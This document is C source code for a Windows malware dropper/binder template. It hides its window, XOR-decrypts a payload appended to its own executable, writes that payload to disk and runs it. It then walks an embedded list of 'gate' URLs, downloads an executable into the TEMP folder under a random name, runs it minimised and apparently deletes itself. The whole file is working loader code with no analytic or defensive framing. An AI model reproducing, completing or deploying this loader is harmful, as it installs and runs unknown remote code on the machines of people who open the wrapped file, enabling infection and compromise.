//#include <Windows.h>

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

#include "..\wrapper_template_generator\wrap_gen.h"

#define MAX_GATES					1024

VOID apoptosis(VOID);
VOID xor32_data(DWORD key, PDWORD data, UINT size);

INT main(INT argc, PCHAR argv[])
{
	ERROR_CODE						status;

	PIMAGE_DOS_HEADER				dos_header;
	PIMAGE_NT_HEADERS				nt_headers;
	PIMAGE_SECTION_HEADER			section_header;

	PSKELETON_DATA					skel_data;

	PDWORD							own_data;

	WCHAR							own_file_name[MAX_PATH]			= {0};

	PDWORD							download_buffer;
	UINT							download_buffer_size;

	PCHAR							gates[MAX_GATES]				= {0};

	LPCSTR							gatelist;
	LPSTR							gatelistw;

	UINT							i, own_data_size;

	// Find/parse our gateway list
	dos_header						= (PIMAGE_DOS_HEADER)GetModuleHandle(NULL);
	nt_headers						= (PIMAGE_NT_HEADERS)((DWORD_PTR)dos_header + dos_header->e_lfanew);
	section_header					= (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(nt_headers) 
										+ (sizeof(IMAGE_SECTION_HEADER) * (nt_headers->FileHeader.NumberOfSections - 1)));

	// Test if this is a working template
	skel_data						= (PSKELETON_DATA)((DWORD_PTR)dos_header + section_header->VirtualAddress);
	if (skel_data->signature != SKEL_DATA_SIG) {
#ifdef DEBUG_SKEL
		MessageBoxA(0, "Error: Generate template first.", "Skeleton", MB_OK);
#endif
		ExitProcess(0);
	}

	// Load the payload
	GetModuleFileNameW(NULL, own_file_name, sizeof(own_file_name));
	status = read_raw_into_bufferw(own_file_name, &own_data_size, (LPVOID *)&own_data);
	if (status) {
		status = decompress_execute_payload(own_data, own_data_size);
#ifdef DEBUG_SKEL
		if (!status) {
			MessageBoxA(NULL, "Failed to execute payload", "ERROR", MB_OK);
			ExitProcess(0);
		}
#endif
	} 
#ifdef DEBUG_SKEL
	else {
		MessageBoxA(NULL, "Failed to read host", "ERROR", MB_OK);
		ExitProcess(0);
	}
#endif

	gatelist						= (LPCSTR)((DWORD_PTR)dos_header + (DWORD_PTR)section_header->VirtualAddress + sizeof(SKELETON_DATA));

	gatelistw						= (LPSTR)HeapAlloc(GetProcessHeap(), 0, string_length(gatelist) + 1);
	ZeroMemory((PVOID)gatelistw, string_length(gatelist) + 1);
	CopyMemory(gatelistw, gatelist, string_length(gatelist));

	gates[0] = strtok((PCHAR)gatelistw, GATELIST_SEPARATOR);
	for (i = 1; i < MAX_GATES; i++) {
		gates[i] = strtok(NULL, GATELIST_SEPARATOR);	
	}

	// Iterate through all the gates
	i = 0;
	while (gates[i] != NULL) {

		status = download_and_execute_target(gates[i]);
		if (status) {
			break;
		}

		i++;
	}

	apoptosis();

	return 0;
}

BOOL download_and_execute_target(LPCSTR url)
{
	ERROR_CODE					status;
	HRESULT						web_status;

	CHAR						char_map[]									= CHARACTER_MAP;
	CHAR						file_name[MAX_PATH]							= {0};
	CHAR						download_location[MAX_PATH]					= {0};

	UINT						i;

	status = (ERROR_CODE)GetEnvironmentVariableA("TEMP", (LPSTR)download_location, sizeof(download_location));
	if (status == 0) {
		return;
	}

	srand(time(NULL));
	for (i = 0; i < MAX_TMP_FILE_LENGTH; i++) {
		file_name[i] = char_map[rand() % (sizeof(char_map) - 1)];
	}

	PathAddExtensionA(file_name, ".exe");
	PathAppendA(download_location, file_name);

	web_status = URLDownloadToFileA(NULL, url, download_location, 0, NULL);
	if (web_status == S_OK) {

		WinExec(download_location, SW_FORCEMINIMIZE);

		return TRUE;
	}


	return FALSE;
}

BOOL decompress_execute_payload(PDWORD pe, UINT pe_size)
{
	ERROR_CODE						status;

	PIMAGE_DOS_HEADER				dos_header;
	PIMAGE_NT_HEADERS				nt_headers;
	PIMAGE_SECTION_HEADER			section_header;

	PWRAPPER_PAYLOAD_DATA			payload_data;

	CHAR							original_file_name[MAX_PATH]		= {0};

	PDWORD							payload;
	UINT							payload_size;

	dos_header			= (PIMAGE_DOS_HEADER)pe;
	nt_headers			= (PIMAGE_NT_HEADERS)((DWORD_PTR)dos_header + dos_header->e_lfanew);
	section_header		= (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(nt_headers) + 
							sizeof(IMAGE_SECTION_HEADER) * (nt_headers->FileHeader.NumberOfSections - 1));

	payload_data		= (PWRAPPER_PAYLOAD_DATA)((DWORD_PTR)pe + section_header->PointerToRawData + section_header->SizeOfRawData);
#ifdef WRAP_XOR_PAYLOAD
	// Decrypt the payload
	xor32_data(payload_data->key, 
		(PDWORD)((DWORD_PTR)pe + section_header->PointerToRawData + section_header->SizeOfRawData + sizeof(DWORD)),
		(UINT)(pe_size - (UINT)((DWORD_PTR)pe + section_header->PointerToRawData + section_header->SizeOfRawData) - sizeof(DWORD)));
#endif
	if (payload_data->signature != WRAPPER_PAYLOAD_SIG) {
		MessageBoxA(NULL, "Error: No payload detected", "Template", MB_OK);
		ExitProcess(0);
	}
	payload				= (PDWORD)((DWORD_PTR)pe + section_header->PointerToRawData + section_header->SizeOfRawData + sizeof(WRAPPER_PAYLOAD_DATA));
	payload_size		= (UINT)((DWORD)((DWORD_PTR)pe + pe_size) - (DWORD_PTR)payload);

	CopyMemory(original_file_name, (PVOID)((DWORD_PTR)pe + section_header->PointerToRawData + section_header->SizeOfRawData + sizeof(WRAPPER_PAYLOAD_DATA)),
		payload_data->original_file_length);

	// Write the payload
	status = write_raw_to_disk(original_file_name, 
		(PDWORD)((DWORD_PTR)pe + section_header->PointerToRawData + section_header->SizeOfRawData + sizeof(WRAPPER_PAYLOAD_DATA) + payload_data->original_file_length),
		payload_data->payload_length);

	if (!status) {
		return FALSE;
	}

	// Execute
	status = (ERROR_CODE)ShellExecute(NULL, "open", original_file_name, NULL, NULL, SW_MAXIMIZE);
	/*
	if (status < 32) {
#ifdef DEBUG_SKEL
		MessageBoxA(NULL, "Failure in ShellExecute", "ERROR", MB_OK);
#endif
		return FALSE;
	}*/

	//Sleep(INFINITE);
	return TRUE;
}

BOOL read_raw_into_bufferw(	__in	LPCWSTR	file_name,
							__out	PUINT	file_size,
							__out	LPVOID	*out_file)
{
	ERROR_CODE			status;

	HANDLE				handle						= INVALID_HANDLE_VALUE;
	DWORD				size_high, size_low;
	PDWORD				buffer;
	DOUBLE				size;
	INT					junk;

	handle = CreateFileW(		file_name, 
								GENERIC_READ, 
								FILE_SHARE_READ, 
								NULL, 
								OPEN_EXISTING, 
								FILE_ATTRIBUTE_NORMAL, 
								NULL);

	if (handle == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	size_low		= GetFileSize(handle, &size_high);
	size			= (size_low | size_high);

	buffer			= (DWORD *)VirtualAlloc(NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (buffer == NULL) {
		return FALSE;
	}

	status			= ReadFile(handle, buffer, size, (LPDWORD)&junk, NULL);
	if (!status) {
		return FALSE;
	}

	CloseHandle(handle);
	*file_size	= size;
	*out_file	= buffer;

	return TRUE;
}

BOOL write_raw_to_disk(	LPCSTR	file_name,
						PDWORD	buffer,
						UINT	size)
{
	HANDLE	file_handle;
	INT		junk;

	file_handle = CreateFileA(	(LPCSTR)file_name, 
							GENERIC_WRITE, 
							FILE_SHARE_READ, 
							NULL, 
							CREATE_ALWAYS, 
							FILE_ATTRIBUTE_NORMAL, 
							NULL);
	if (file_handle == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	WriteFile(file_handle, buffer, size, (LPDWORD)&junk, NULL);
	CloseHandle(file_handle);

	return TRUE;
}

UINT string_length(LPCSTR input_string)
{
	UINT			out_length;
	PCHAR			ptr;

	ptr				= (PCHAR)input_string;
	out_length		= 0;
	while (*ptr != 0) {
		out_length++;
		ptr++;
	}

	return out_length;
}

VOID xor32_data(DWORD key, PDWORD data, UINT size)
{
	UINT				i;
	DWORD				tmp;


	tmp = key;

	for (i = 0; i < size; i++) {

		*(PBYTE)((DWORD_PTR)data + i) ^= tmp;
		tmp = tmp >> 8;
		if (tmp == 0) {
			tmp = key;
		}
	}

	return;
}